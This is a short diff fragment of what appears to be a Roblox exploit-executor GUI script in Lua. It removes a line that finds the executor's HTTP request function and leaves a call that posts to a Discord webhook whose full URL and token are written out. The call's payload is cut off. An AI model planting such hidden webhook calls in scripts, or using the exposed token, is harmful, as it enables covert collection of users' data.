@@ -1596,7 +1596,6 @@ local script = G2L["20"];
 		return false
 	
 	end
-local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 if request then
     request({
         Url = 'https://discord.com/api/webhooks/1395137173237268571/I3rrbp8lFIV74cMDiCk2EGGBBKjj4KYVWokR8GJbTvoYHSljmPu6Zh3pmzk6u1MrvWgI',
